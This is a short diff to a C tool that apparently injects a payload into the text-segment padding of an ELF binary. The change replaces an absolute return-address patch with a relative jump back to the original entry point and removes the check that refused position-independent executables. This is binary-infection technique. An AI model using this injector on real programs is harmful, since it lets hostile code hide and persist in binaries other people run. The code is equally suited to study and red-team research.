@@ -6,7 +6,7 @@
 #include "logger.h"
 #include "elf.h"
 
-#define RET_PATTERN 0x1111111111111111
+#define RET_PATTERN 0xfffffffc
 
 int main(int argc, char *argv[])
 {
@@ -21,7 +21,7 @@ int main(int argc, char *argv[])
     Elf64_Phdr *target_text_seg;
     Elf64_Shdr *payload_text_sec;
 
-    int gap_offset, gap_len;
+    int gap_offset, gap_len, rel_jmp_offset;
 
     /* check args */
     if (argc != 3) {
@@ -54,12 +54,6 @@ int main(int argc, char *argv[])
     /* get target binary entry point */
     target_hdr = (Elf64_Ehdr *) target_data;
     target_ep = target_hdr->e_entry;
-
-    /* check that elf is of type EXEC */
-    if (target_hdr->e_type != ET_EXEC) {
-        log_err("target not of type ET_EXEC (PIE not supported)");
-        goto error;
-    }
 
     log_debugf("target entry point: %p", (void *) target_ep);
 
@@ -98,9 +92,10 @@ int main(int argc, char *argv[])
             payload_text_sec->sh_size);
 
     /* patch return address */
-    ret = elf_mem_subst(target_data + gap_offset,
-                        payload_text_sec->sh_size,
-                        RET_PATTERN, (long) target_ep);
+    rel_jmp_offset = - (gap_offset - (target_ep - target_base));
+    ret = elf_patch_rel_jmp(target_data + gap_offset,
+                           payload_text_sec->sh_size,
+                            RET_PATTERN, (long) rel_jmp_offset);
     if (ret) {
         log_errf("failed to patch return address (%p)",
                  (void *) (target_data + gap_offset));
